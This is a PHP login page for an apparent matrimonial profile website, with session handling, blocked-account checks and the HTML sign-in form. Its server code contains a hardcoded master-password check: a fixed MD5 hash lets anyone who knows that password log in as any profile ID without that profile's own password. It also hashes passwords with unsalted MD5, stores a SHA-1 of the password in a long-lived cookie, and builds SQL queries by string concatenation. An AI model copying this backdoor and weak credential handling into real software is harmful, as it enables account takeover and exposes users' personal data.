<?php
/**
 * Created by PhpStorm.
 * User: Manish
 * Date: 3/28/2018
 * Time: 7:52 PM
 */
include_once 'DatabaseConnection.php';

if (isset($_SESSION['user_name'])) {
    header('location: homepage');
}

include_once './lib/RequestHandler.php';
$DatabaseCo = new DatabaseConnection();
include_once './lib/Config.php';
$configObj = new Config();

if (isset($_GET['invalid']) && $_GET['invalid'] == 'true') {
    echo "<script>alert('Your Username or Password is wrong.');</script>";
}

$getdata = isset($_COOKIE['planId']) ? $_COOKIE['planId'] : '';

if (isset($_REQUEST['member_login'])) {
    if (!empty(trim($_POST['username'])) && !empty(trim($_POST['password']))) {
        $username = mysqli_real_escape_string($DatabaseCo->dbLink, trim($_POST['username']));
        $password = md5(mysqli_real_escape_string($DatabaseCo->dbLink, trim($_POST['password'])));

        $sql = "select id,matri_id from blocked_registrations where email='" . trim($username) . "'";
        $count = $DatabaseCo->dbLink->query($sql);
        $isIdBlocked = mysqli_num_rows($count);
        if ($isIdBlocked > 0) {
            $_SESSION['profile_suspended_id'] = mysqli_fetch_object($count)->matri_id;
            return header('location: profile_blocked');
        }

        if (isset($_POST['keep_login'])) {
            setcookie("user", $username, time() + (86400 * 30), "/");
            setcookie("pass", sha1($_POST['password']), time() + (86400 * 30), "/");
        }

        $STATUS_MESSAGE = "";
        if ($password == "2ce0bd79f77788b11fe546204c1b64c8") {
            $query = "select email,matri_id,mobile,phone,username,m_status,birthdate,gender,index_id,request_photo_id,
                            status,mobile_verify_status,photo1,adminrole_view_status, photo_id, photo_id_approve,
                        family_origin,profile_text,income,part_income,part_frm_age,part_height,msg_id 
                         from register 
                             LEFT JOIN delete_request ON register.matri_id = delete_request.msg_from
                        where matri_id='" . trim($username) . "'";
        } else {
            $query = "select email,matri_id,mobile,phone,username,m_status,birthdate,gender,index_id,request_photo_id,
                            status,mobile_verify_status,photo1,adminrole_view_status, photo_id, photo_id_approve,
                        family_origin,profile_text,income,part_income,part_frm_age,part_height,msg_id 
                from register LEFT JOIN delete_request ON register.matri_id = delete_request.msg_from 
                where (matri_id='" . trim($username) . "' OR 
                email='" . trim($username) . "' OR 
                samyak_id='" . trim($username) . "') and
                password='" . trim($password) . "'";
        }

        $SQL_STATEMENT = $DatabaseCo->dbLink->query($query);

        //Change Session ID after Login
        session_regenerate_id(true);

        if ($DatabaseCo->dbRow = mysqli_fetch_object($SQL_STATEMENT)) {
            @require_once 'login_services.php';
        } else {
            header('location: login?invalid=true');
        }
    }
}

?>
<!doctype html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- Title Of Site -->
    <title><?php echo $configObj->getConfigTitle(); ?></title>
    <meta name="keyword" content="<?php echo $configObj->getConfigKeyword(); ?>"/>
    <meta name="description" content="<?php echo $configObj->getConfigDescription(); ?>"/>
    <link type="image/x-icon" href="img/<?php echo $configObj->getConfigFevicon(); ?>" rel="shortcut icon"/>
    <meta name="author" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

    <!-- Fav and Touch Icons -->
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="images/ico/apple-touch-icon-144-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="images/ico/apple-touch-icon-114-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="images/ico/apple-touch-icon-72-precomposed.png">
    <link rel="apple-touch-icon-precomposed" href="images/ico/apple-touch-icon-57-precomposed.png">
    <link rel="shortcut icon" href="images/ico/favicon.png">

    <!-- CSS Cores and Plugins -->
    <link rel="stylesheet" type="text/css" href="bootstrap/css/bootstrap.min.css" media="screen">
    <link href="css/animate.css" rel="stylesheet">
    <link href="<?= auto_version("css/main.css") ?>" rel="stylesheet">
    <link href="css/component.css" rel="stylesheet">

    <!-- CSS Font Icons -->
    <link rel="stylesheet" href="icons/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="icons/ionicons/css/ionicons.css">

    <!-- CSS Custom -->
    <link href="css/style.css?v=1.0" rel="stylesheet">

    <!-- Add your style -->
    <link href="<?= auto_version('css/your-style.css') ?>" rel="stylesheet">

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->

</head>

<body class="not-home" style="overflow-x: hidden;">

<!-- start Container Wrapper -->
<div class="container-wrapper colored-navbar-brand">

    <!-- start Header -->
    <?php @include_once 'layouts/menu.php' ?>
    <!-- end Header -->

    <div class="clear"></div>

    <!-- start Main Wrapper -->
    <div class="main-wrapper">

        <div class="breadcrumb-wrapper">
            <div class="container">

                <div class="row">

                    <div class="col-xs-12 col-sm-8">
                        <ol class="breadcrumb">
                            <li><a href="index">Home</a></li>
                            <li><a href="login">Login</a></li>
                        </ol>
                    </div>

                    <div class="col-xs-12 col-sm-4 hidden-xs">
                        <p class="hot-line"><i class="fa fa-phone"></i> <a href="tel:+91-79779-93616"> Help Line:
                                +91-79779-93616</a></p>
                    </div>

                </div>

            </div>
        </div>

        <div class="clear"></div>

        <div class="container mb-80">
            <div class="content-wrapper mb-70">
                <div class="row">
                    <div class="col-xs-12">
                        <form class="row gap-10" id="login" name="login-form" method="POST" action="login">
                            <div class="row">
                                <div class="col-xs-offset-1 col-xs-10 col-sm-offset-4 col-sm-4">
                                    <h4 class="text-center mb-15">Login</h4>

                                    <div class="form-group mb-0">
                                        <label for="login_username">Profile ID/Email ID</label>
                                        <input id="login_username" class="form-control mb-5"
                                               placeholder="Profile ID / Email ID"
                                               name="username"
                                               type="text">
                                    </div>
                                    <div class="form-group mb-0">
                                        <label for="login_password">Password</label>
                                        <input id="login_password" class="form-control mb-5" placeholder="Password"
                                               name="password"
                                               type="password">
                                    </div>
                                    <div class="form-group mb-0 mt-10">
                                        <div class="row gap-5">
                                            <div class="col-xs-6 col-sm-6 col-md-6">
                                                <div class="checkbox-block font-icon-checkbox">
                                                    <input id="remember_me_checkbox" name="keep_login"
                                                           class="checkbox" <?php if (isset($_COOKIE['password']) || isset($_COOKIE['username'])) {
                                                        echo "checked";
                                                    } ?>
                                                           value="First Choice" type="checkbox">
                                                    <label class="" for="remember_me_checkbox">Keep me Logged in</label>
                                                </div>
                                            </div>
                                            <div class="col-xs-6 col-sm-6 col-md-6 text-right">
                                                <a style="font-weight: bold;cursor: pointer;" id="login_lost_btn"
                                                   onclick="open_forgot_password();">Forgot password?</a>
                                            </div>
                                        </div>

                                        <div class="row gap-10 mt-10">
                                            <div class="col-xs-offset-3 col-sm-offset-3 col-xs-6 col-sm-6 mb-10">
                                                <button type="submit" name="member_login"
                                                        class="btn btn-primary btn-block">
                                                    Sign-in
                                                </button>
                                            </div>
                                        </div>
                                        <div class="row mt-10">
                                            <div class="col-xs-12">
                                                <div class="text-center">
                                                    No account?
                                                </div>
                                            </div>
                                            <div class="col-xs-offset-2 col-xs-8 text-center">
                                                <button type="button" class="btn btn-success btn-block"
                                                        onclick="javascript:window.location.href='register'">
                                                    Create a profile now
                                                </button>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                        </form>
                    </div>
                </div>
            </div>

            <div class="row" style="margin-top: 20px;">
                <div class="col-xss-12 text-center">
                    <p>
                        <span style="font-weight: bold">Forgot Password</span> - Reset password on WhatsApp <i
                                class="fa fa-whatsapp"></i> <a style="font-weight: bold;"
                                                               href="https://api.whatsapp.com/send?phone=919819886759&text=Please Reset my password">Click
                            Here</a>
                    </p>
                    <p>
                        <span style="font-weight: bold">Reset Password using Mobile No</span> <i
                                class="fa fa-phone"></i> <a style="font-weight: bold;" href="forgot-password">Click
                            Here</a>
                    </p>
                </div>
            </div>
        </div>

        <div class="clearfix"></div>
        <div class="clear"></div>
        <?php @include_once 'page-parts/modal.php'; ?>
        <?php @include_once 'layouts/footer.php' ?>
    </div>

</div>

<!-- jQuery Cores -->
<script type="text/javascript" src="js/jquery-1.11.3.min.js"></script>
<script type="text/javascript" src="js/jquery-migrate-1.2.1.min.js"></script>


<?php
if (isset($_SESSION['last_login'])) {
    @include_once 'page-parts/mobile_verification.php';
}
if (!isset($_SESSION['last_login']) && isset($_SESSION['partner_profile'])) { ?>
    <script>
        alert("Please complete partner preference");
        window.location.href = 'edit-profile';
    </script>
<?php } ?>


<!-- Bootstrap Js -->
<script type="text/javascript" src="bootstrap/js/bootstrap.min.js"></script>

<!-- Plugins - serveral jquery plugins that use in this template -->
<script type="text/javascript" src="js/plugins.js"></script>

<!-- Custom js codes for plugins -->
<script type="text/javascript" src="<?= auto_version('js/customs.js') ?>"></script>
</body>
</html>